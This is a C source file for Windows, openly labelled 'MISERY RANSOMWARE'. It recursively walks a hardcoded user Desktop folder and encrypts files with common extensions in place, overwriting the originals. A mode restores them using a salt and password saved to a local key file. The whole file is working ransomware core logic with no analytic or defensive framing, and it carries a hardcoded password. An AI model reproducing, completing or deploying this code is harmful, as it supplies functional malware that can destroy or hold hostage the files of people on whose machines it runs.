#include "crypto.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <io.h>
#include <windows.h>

// Define EXTENSIONS TO ENCRYPT/DECRYPT
const char *EXTS[] = {".txt",".jpg",".c",".h",".md",".iso",".png",0};

bool is_target(const char *filename) {
    const char *dot = strrchr(filename, '.');
    if (!dot) return false;
    for(int i=0;EXTS[i];++i) if (_stricmp(dot,EXTS[i])==0) return true;
    return false;
}

// ENCRYPT: overwrites file in-place!
bool MiseryEncryptFile(const char *path, CRYPTO_CTX *ctx) {
    FILE *in = fopen(path, "rb");
    if (!in) { printf("[!] Open fail: %s\n", path); return false; }
    fseek(in, 0, SEEK_END); long sz = ftell(in); rewind(in);
    if (sz <= 0 || sz > MAX_BUFFER_SIZE) { printf("[!] Invalid size: %s\n", path); fclose(in); return false; }
    BYTE *plain = malloc(sz); if (!plain) { fclose(in); return false; }
    if (fread(plain,1,sz,in)!=sz) { printf("[!] Read fail: %s\n", path); free(plain); fclose(in); return false; }
    fclose(in);

    DWORD outcap = CRYPTO_REQUIRED_CAPACITY(sz); BYTE *cipher = malloc(outcap); DWORD outlen = 0;
    if (!cipher) { free(plain); return false; }
    CRYPTO_ERROR cerr = EncryptBuffer(ctx, plain, sz, cipher, &outlen, outcap);

    if (cerr != CRYPTO_SUCCESS) {
        printf("[!] EncryptBuffer failed: %s: %s\n", path, GetErrorString(cerr));
        free(plain); free(cipher); return false;
    }
    FILE *out = fopen(path,"wb");
    if (!out || fwrite(cipher,1,outlen,out)!=outlen) {
        printf("[!] Overwrite fail: %s\n", path); if(out)fclose(out); free(plain); free(cipher); return false;
    }
    fclose(out);
    printf("[+] Encrypted (overwritten): %s (%ld bytes)\n", path, sz);
    free(plain); free(cipher); return true;
}

// DECRYPT: overwrites file in-place!
bool MiseryDecryptFile(const char *path, CRYPTO_CTX *ctx) {
    FILE *in = fopen(path, "rb");
    if (!in) { printf("[!] Open fail: %s\n", path); return false; }
    fseek(in, 0, SEEK_END); long sz = ftell(in); rewind(in);
    if (sz <= 0 || sz > MAX_BUFFER_SIZE) { printf("[!] Invalid size: %s\n", path); fclose(in); return false; }
    BYTE *cipher = malloc(sz); if (!cipher) { fclose(in); return false; }
    if (fread(cipher,1,sz,in)!=sz) { printf("[!] Read fail: %s\n", path); free(cipher); fclose(in); return false; }
    fclose(in);
    BYTE *plain = malloc(sz); DWORD plainlen = 0;
    if (!plain) { free(cipher); return false; }
    CRYPTO_ERROR cerr = DecryptBuffer(ctx, cipher, sz, plain, &plainlen, sz);
    if (cerr != CRYPTO_SUCCESS) {
        printf("[!] DecryptBuffer failed: %s: %s\n", path, GetErrorString(cerr));
        free(plain); free(cipher); return false;
    }
    FILE *out = fopen(path,"wb");
    if (!out || fwrite(plain,1,plainlen,out)!=plainlen) {
        printf("[!] Overwrite fail: %s\n", path); if(out)fclose(out); free(plain); free(cipher); return false;
    }
    fclose(out);
    printf("[+] Decrypted (overwritten): %s (%ld bytes)\n", path, plainlen);
    free(plain); free(cipher); return true;
}

void TraverseAndEncrypt(const char *dir, CRYPTO_CTX *ctx, bool decryptmode) {
    char pattern[4096];
    struct _finddata_t c_file;
    snprintf(pattern,sizeof(pattern),"%s\\*",dir);
    intptr_t hFile = _findfirst(pattern,&c_file);
    if(hFile==-1L) return;
    do {
        if(strcmp(c_file.name,".")==0 || strcmp(c_file.name,"..")==0) continue;
        char path[4096]; snprintf(path,sizeof(path),"%s\\%s",dir,c_file.name);
        if(c_file.attrib&_A_SUBDIR) TraverseAndEncrypt(path,ctx,decryptmode);
        else if(is_target(path)) {
            if(decryptmode) MiseryDecryptFile(path,ctx); else MiseryEncryptFile(path,ctx);
        }
    } while(_findnext(hFile,&c_file)==0);
    _findclose(hFile);
}

int main(int argc,char**argv) {
    puts("========== MISERY RANSOMWARE: Overwrite + Decrypt Support ==========");
    // ====== CONFIG:
    const char *KEYFILE = "misery.key";
    char key[256] = {0};
    BYTE salt[SALT_SIZE] = {0};

    bool decryptmode = (argc > 1 && strcmp(argv[1], "-d") == 0);

    // ====== PASSWORD:
    if (!decryptmode) {
        snprintf(key, sizeof(key), "Thejahanzaib@1318"); // Use your password here

        // First time: init and save current salt & password
        if (InitCrypto(key, strlen(key), NULL) != CRYPTO_SUCCESS) {
            puts("[!] Failed to initialize crypto!"); return 1;
        }
        memcpy(salt, GetCryptoCtx()->salt, SALT_SIZE);

        FILE *k = fopen(KEYFILE,"wb");
        fwrite(salt,1,SALT_SIZE,k); // Store salt first
        fprintf(k, "%s\n", key); // Store password in cleartext (for simulation)
        fclose(k);
        puts("[*] Key and salt saved to misery.key");
    } else {
        // Decrypt mode: read salt and key from file
        FILE *k = fopen(KEYFILE,"rb"); if(!k) { puts("[!] Missing misery.key!"); return 1;}
        fread(salt,1,SALT_SIZE,k);
        fgets(key, sizeof(key), k);
        key[strcspn(key,"\r\n")]=0;
        fclose(k);

        if (InitCrypto(key, strlen(key), salt) != CRYPTO_SUCCESS) {
            puts("[!] Failed to initialize crypto for decrypt!"); return 1;
        }
        printf("[*] Decrypt mode: salt and key loaded from misery.key\n");
    }

    // ====== TARGET DIRECTORY (edit this)
    const char *targetdir = "C:\\Users\\jahan\\OneDrive\\Desktop";
    TraverseAndEncrypt(targetdir, GetCryptoCtx(), decryptmode);

    CleanupCrypto();
    puts("[+] Done");
    return 0;
}
